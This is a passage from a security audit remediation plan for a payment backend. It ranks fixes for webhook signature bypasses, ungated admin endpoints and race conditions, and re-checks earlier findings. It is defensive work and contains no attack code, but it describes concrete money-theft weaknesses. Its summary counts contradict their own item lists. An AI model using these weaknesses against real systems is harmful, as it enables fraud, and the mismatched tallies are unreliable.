**Dependencies:** Theme 2 (avoid widening attack surface during refactor). **Fixes:** C7, C8, C11, C12, C13, C14, H7, H8, H9, H13, H14, H15, H16, H20.
- Refactor `spendFunds`, `updateWalletBalance`, `updateTransactionStatus` to accept `trx` parameter.
- Wrap withdrawal create, withdrawal markAsPaid, bank-transfer completion, PhonePe webhook, PayPal webhook handlePaymentCompleted/handlePaymentRefunded, Stripe handleChargeRefunded, admin cancelOrder in `strapi.db.transaction` with `forUpdate` on relevant rows.
- Add idempotency timestamps (refundedAt, paidAt) on withdrawal-request.
- Add lifecycle beforeUpdate to stash previousData for proper status-transition guards.

### Theme 4: Webhook signature + replay defense
**Dependencies:** Theme 2. **Fixes:** C6, H2, H3, H17, H21, H22, M-06.
- Remove PayPal sandbox bypass; fix CRC32 vs SHA-256 spec compliance; use raw body.
- Razorpay: use raw body via `Symbol.for('unparsedBody')`; constant-time compare.
- PhonePe: constant-time compare.
- Remove Stripe NODE_ENV=development bypass.
- New `webhook_event_log` table (event_id PK, gateway) for cross-gateway dedup.

### Theme 5: Schema integrity + DB constraints
**Dependencies:** Independent (migrations). **Fixes:** H23, H24, M-30, M-31, M-32, M-33, M-34, M-27, M-28.
- Unique compound index on transactions(gateway, gatewayTransactionId).
- Unique index on user_wallets users_permissions_user link.
- Mark required:true on user_wallet, users_permissions_user, publisher fields.
- Add 'failed'/'reversed' to withdrawal_status enum.
- Add disputeReason + revisionCount columns to orders.
- Add 'phonepe', 'payoneer' to transaction.gateway enum.

### Theme 6: Forensic logging + audit
**Dependencies:** Theme 3 (audit rows inside tx). **Fixes:** H25, H26, H27, H28, H29, L-09, M-11, M-12, M-13, M-19.
- Wire createAuditLog into every order state transition.
- Wire admin-audit-log into every admin money handler.
- Convert console.log money mutations to structured strapi.log events.
- Raise BASEAMOUNT_TAMPER + signature failure logs to ERROR with full context.
- raiseFraudAlert helper → email/Slack on amount-mismatch.

### Theme 7: Environment hardening
**Dependencies:** None. **Fixes:** C10, M-15, M-16, M-17, M-14.
- Rotate ExchangeRate-API key; remove hardcoded fallback.
- Throw at boot for missing JWT_SECRET, CLERK_JWT_ISSUER, all gateway secrets.
- Single source of truth for fee/GST/FX rates.

### Theme 8: Data leak surfaces
**Dependencies:** Theme 2 partially. **Fixes:** M-01, M-10, L-01, M-42, M-43.
- Gate `/api/transactions/status/:id` behind JWT + ownership.
- Scrub wallet/saltKey logs.
- Generic error responses; log details server-side only.
- Remove typo'd duplicate `/api/api/...` routes.

---

## 6. Fix Priority Order

Ship in this order. Each ticket should land within hours of the previous one (chained dependencies are minimal).

1. **C10 (S, low risk):** Rotate ExchangeRate-API key + remove hardcoded fallback. *Why first:* Secret is in source-control; rotate before any disclosure.
2. **C5 (S, low risk):** Add is-admin policy to `/api/wallet/fix-earnings` (or delete the endpoint). *Why second:* One-line config change, kills system-wide-inflate vector immediately.
3. **C4 (S, low risk):** Add admin policy/middleware to `/api/transactions/manual-update-razorpay`. *Why third:* Same simple config fix; kills self-credit primitive.
4. **C3 (S, low risk):** Add ctx.state.user-derived walletId to `verifyPayPalPayment`. *Why fourth:* Direct money-theft path.
5. **C9 (S, medium risk):** Delete generic `/webhook/:gateway` routes + handler. *Why fifth:* Removes weaker parallel webhook path immediately; mitigates C1, H1, H4 amplification.
6. **C1 (S, low risk):** Lock currency to USD in computeFees for Stripe/PayPal/PhonePe. *Why sixth:* Defeats the entire M11 bypass for the three gateways with one guard.
7. **C2 (S, low risk):** Add `expectedChargeCents` to PayPal customIdData. *Why seventh:* Re-arms M11 for PayPal before grace period ends.
8. **C6 (M, medium risk):** Remove PayPal sandbox signature bypass. *Why eighth:* Single env-var typo otherwise re-opens everything.
9. **C12 (M, low risk):** Wrap PhonePe webhook + status in db.transaction + forUpdate. Add M11 check. Move /phonepe-status behind auth.
10. **C7 (M, low risk):** Bank-transfer completion: idempotency + tx wrap + correct schema fields + admin policy + derive userId from session.
11. **C13 (M, low risk):** Withdrawal markAsPaid row-lock + FK lookup + dedup admin endpoints.
12. **C11 (M, medium risk):** Refactor spendFunds to accept trx + forUpdate. Propagate from order.create.
13. **C14 (M, high risk):** PayPal refund decrements mainBalance correctly. Add wallet invariant assertion at boot.
14. **C8 (M, medium risk):** Withdrawal lifecycle: add refundedAt/paidAt + previousData guard.
15. **H2 + H22 (S, low):** Razorpay raw body + timingSafeEqual.
16. **H3 (M, medium):** PayPal CRC32 + raw body.
17. **H5 + H6 (M, medium):** Override default Strapi CRUD on transaction + withdrawal-request.
18. **H7 (M, medium):** Withdrawal create wallet lock.
19. **H8 (M, low):** PayPal handlePaymentCompleted lock + dedup.
20. **H9 (M, medium):** Razorpay verifyPayment + manualUpdate + cleanupPending locks.
21. **H10 (M, medium):** Razorpay verifyPayment auth + caller binding.
22. **H11 + H12 (M, medium):** Admin updateStatus/cancelOrder route through services.
23. **H13 (S, low):** Stripe handleChargeRefunded idempotency.
24. **H14 (M, medium):** deliverOrder controller → service.
25. **H15 (S, low):** Delete or fix admin withdrawals.pay().
26. **H16 + H20 (S, low):** Withdrawal lookup by FK + lifecycle idempotency.
27. **H17 (S, low):** PhonePe constant-time + M11 check.
28. **H18 (S, low):** add-promo-funds — delete or require valid promo code.
29. **H19 (L, medium):** PayPal payout failed/completed handlers.
30. **H21 (M, low):** Webhook event-id dedup table.
31. **H23 + H24 (M, medium):** DB unique constraints (transactions, user-wallets).
32. **H25–H29 (M, low):** Forensic logging build-out.
33. **H30 (S, low):** Withdrawals filter merge order fix.
34. M-tier and L-tier: ship in clusters by theme over subsequent sprint.

---

## 7. Production-Impact Assessment

| Fix | Blast Radius | Rollback Plan | Customer-Visible Side Effects |
|-----|--------------|---------------|-------------------------------|
| C10 (rotate API key) | All FX conversions; ~1 minute API call retry on the few requests in flight at swap | Re-apply old key env, revert app deploy | None if old key remains valid briefly during rotation |
| C5 (delete fix-earnings or add admin policy) | None — endpoint is a one-shot tool | Re-enable in next deploy | None |
| C4 (admin gate manual-update-razorpay) | Admin debug flow | Revert route config | Admin must use admin JWT (already required for sibling endpoints) |
| C3 (verify-paypal ownership) | Manual PayPal verify flow (rare fallback) | Revert; risk re-opens vuln | Legitimate users on a different wallet than they're authenticated as get 403 (expected — security improvement) |
| C9 (delete generic webhook) | If any prod webhook is pointed at the legacy URL, those deliveries 404 | Re-register route + log; investigate | Check gateway dashboards for any subscriptions pointed at `/api/transactions/webhook/:gateway` before delete |
| C1 (currency allowlist) | Stripe/PayPal/PhonePe non-USD payments rejected | Revert allowlist | Customers attempting non-USD payments to those gateways get 400; legitimate Indian customers route through Razorpay (already INR-locked) |
| C2 (PayPal expectedChargeCents) | All future PayPal orders carry the field | None needed; backward-compatible | None |
| C6 (PayPal sandbox bypass removal) | Dev environments without valid signing certs lose verification | Set `PAYPAL_ENVIRONMENT=live` correctly in dev | If dev env can't run PayPal sandbox cert verification, must use Stripe CLI-equivalent for PayPal or wire a separate test-only opt-in |
| C7 (bank-transfer schema fix) | Bank transfer completion path | Revert; risk re-opens double-credit | Admin sees correct audit row + no double-credit on retries |
| C8 (withdrawal lifecycle idempotency) | All withdrawal status edits | Migration adds nullable timestamps; backward-compat | Admin editing notes on denied withdrawals no longer fires refund — expected |
| C11 (spendFunds lock) | Every order create | Revert refactor; risk re-opens over-spend | Slightly higher contention on heavy advertisers; latency impact <5ms typical |
| C12 (PhonePe lock + auth) | All PhonePe deposits | Revert | /phonepe-status requires JWT — frontend already authenticates so minimal user-visible change |
| C13 (markAsPaid lock) | Admin withdrawal approval | Revert | Concurrent admin actions serialize — minor UX wait, prevents double-pay |
| C14 (PayPal refund mainBalance) | PayPal refund flow | Revert; risk re-opens double-spend | Wallet balance correctly drops on refund; users may notice if they had been silently benefiting |
| H2/H22 (Razorpay raw body + timingSafeEqual) | Razorpay webhook | Revert if signature failures spike | Should be transparent; legitimate webhooks verify identically |
| H3 (PayPal CRC32) | PayPal webhook in live mode | Revert | Currently broken-by-design in live; fix enables actual signature verification |
| H5/H6 (default CRUD overrides) | Public API surface | Revert | Clients using GET /api/transactions to enumerate may break — already a bug; legitimate clients use scoped endpoints |
| H7 (withdrawal create lock) | All publisher withdrawals | Revert | Slight serialization; correct behavior |
| H8 (PayPal webhook lock) | PayPal deposits | Revert | No user-visible change |
| H11 (admin updateStatus routing) | Admin order status changes | Revert | Admin cancel/reject correctly refunds escrow; cancel + refund are now atomic |
| H14 (deliverOrder routing) | Publisher delivery | Revert | Publisher must accept before deliver (state-machine correct); UI may need an "Accept then Deliver" combo button if currently one-click |
| H17 (PhonePe constant-time + M11) | PhonePe deposits | Revert | Transparent |
| H18 (add-promo-funds) | Promo redemption flow | Verify users redirected to /redeem-promo | None if endpoint deleted |
| H23/H24 (DB unique indexes) | All transaction inserts, all wallet creates | Migration with `IF EXISTS DROP` available; if dupes exist, backfill consolidation first | None if no dupes; if dupes present, migration aborts until cleaned |
| H26/H27/H28 (audit log build-out) | Every money mutation | Try/catch wrapper means audit failure doesn't block money flow | More disk usage; admin panel gains real audit trail |

---

## 8. Re-Verification Verdicts (M1–M12, T1–T14)

| Item | Original Issue | Current Status | Evidence |
|------|---------------|----------------|----------|
| **M1** | cancelOrder accepts user-supplied cancelledBy='system' | **STILL FIXED** | Verified at controllers/order.js:2843+ (cancelOrderAtomic enforces server-derived cancelledBy). No regression in concurrent paths. |
| **M2** | create() splats orderData | **STILL FIXED** | ALLOWED_ORDER_CREATE_FIELDS allowlist at controllers/order.js:20-25. |
| **M3** | rejectOrder status flip outside refund tx | **STILL FIXED** | services/order.js:599-615 — status flip is inside the service transaction. |
| **M4** | Admin updateStatus bypasses money for rejected/cancelled | **STILL OPEN** | controllers/admin/orders.js:174-178 TODO admits it. Routes to entityService.update directly. (See H11.) Also admin cancelOrder regression in H12. |
| **M5** | completeOrder no revisionStatus guard | **STILL FIXED** | services/order.js:222, 262-266 check revisionStatus. |
| **M6** | disputeReason written to non-existent column | **STILL OPEN** | Schema lacks disputeReason. Also TERMINAL_STATUSES missing 'disputed' (qa2-6, partially fixed). |
| **M7** | cancelOrder non-transactional | **STILL FIXED (user-facing)**, **REGRESSED (admin path)** | services/order.js:1019 cancelOrderAtomic OK. Admin /admin/orders/:id/cancel doesn't use it (H12). |
| **M8** | (duplicate of M3) | **STILL FIXED** | N/A. |
| **M9** | No revision counter | **STILL OPEN** | Schema lacks revisionCount. (M-28.) |
| **M10** | Order audit log only fires for cancellation | **STILL OPEN** | grep confirms single caller in services/order.js:1065 (cancelOrderAtomic). (H26.) |
| **M11** | createPayment trusts baseAmount | **PARTIALLY FIXED / REGRESSED** | Fix shipped for Stripe + Razorpay (dedicated webhook handlers do expectedChargeCents check). REGRESSED via: (a) currency bypass (C1), (b) PayPal customId drops expectedChargeCents (C2), (c) generic /webhook/:gateway path lacks check (C9), (d) PhonePe never had it (H1, H17), (e) createPendingTransaction lacks server-side compute (H4). |
| **M12** | Razorpay webhook signs re-serialized JSON | **REGRESSED / NEVER FIXED** | razorpay-webhook.js:48 still uses JSON.stringify(body). Multiple lenses converge. (H2, H22.) |
| **T1** | Bank-transfer completion invalid enums | **REGRESSED** | Code unchanged: type='bank_transfer' not in enum, status='completed' wrong field name, missing required fields. (C7.) |
| **T2** | markAsPaid no row-lock + fuzzy lookup | **REGRESSED** | No db.transaction or forUpdate. Fuzzy $contains lookup still in place. (C13, H16.) |
| **T3** | (no findings reference T3 explicitly) | **STATUS UNKNOWN** | Not in re-verify scope per task brief. |
| **T4** | admin/withdrawals.pay() invalid schema fields | **REGRESSED** | Code unchanged at admin/controllers/withdrawals.js:310-369. Wrong field names (transactionType, status, transactionId, paymentGateway). (H15.) |
| **T5** | debug/fixMissing endpoints ungated | **PARTIALLY FIXED / WORSE** | debugTransactions/fixMissingTransactions handlers exist but have NO route wiring (good). HOWEVER discovered: `/api/wallet/fix-earnings` is system-wide ungated (C5). |
| **T6** | Default /api/transactions CRUD ungated | **REGRESSED** | Default routes still registered (lines 32-60). create scope shared with createPayment. Live test confirmed POST 201 with attacker amount. (H5.) |
| **T7** | Withdrawal create no row-lock | **REGRESSED** | No db.transaction or forUpdate at any of read/check/create/update steps. (H7, M-09.) |
| **T8** | deliverOrder TOCTOU | **REGRESSED** | Controller still inlines its own queries, no row lock, allows pending→delivered. (H14.) |
| **T9** | PhonePe webhook outside tx | **REGRESSED** | No strapi.db.transaction, no forUpdate. Idempotency is racy read-check-write. (C12, H1.) |
| **T10** | createPendingTransaction no allowlist | **REGRESSED** | Still no server-side computeFees, accepts body amount/gateway/walletId. (H4.) |
| **T11** | Public /transactions/status/:id leak | **STILL OPEN** | routes lines 62-77 auth:false. Returns amount/currency/invoice. (M-01.) |
| **T12** | /phonepe-status auth:false credits wallet | **REGRESSED** | Route still auth:false. Handler credits on COMPLETED. (C12.) |
| **T13** | Razorpay verifyPayment auth:false | **REGRESSED** | Route still auth:false. Handler can race webhook for double-credit (H9) and brick victim tx (H10). |
| **T14** | Duplicate /webhook/:gateway routes | **REGRESSED** | Both /api/transactions/webhook/:gateway and /api/api/transactions/webhook/:gateway still registered. Generic handler skips M11. (C9.) |

**Summary:** Of 14 prior must-fix items (M1–M12 + T1–T14, excluding T3 not in scope):
- **5 STILL FIXED**: M1, M2, M3, M5, M8
- **1 PARTIALLY FIXED**: M7 (regressed in admin path), M11 (regressed via 4 bypass vectors), T5 (worse new endpoint discovered)
- **3 STILL OPEN (never fixed)**: M4, M6, M9, M10, T11
- **9 REGRESSED OR NEVER FIXED**: M12, T1, T2, T4, T6, T7, T8, T9, T10, T12, T13, T14

The pattern reveals that fixes shipped at the original site (e.g., M11 in stripe-webhook.js) were not propagated to parallel paths (PayPal customId, PhonePe webhook, generic webhook, manual verify endpoints, createPendingTransaction). **The audit's central lesson: every money-flow finding must be fixed across ALL paths that reach the same code, not just the originally-cited file.** Suggest establishing a "money-flow inventory" of canonical entry points and CI checks that verify each gateway path conforms to the same hardening contract.
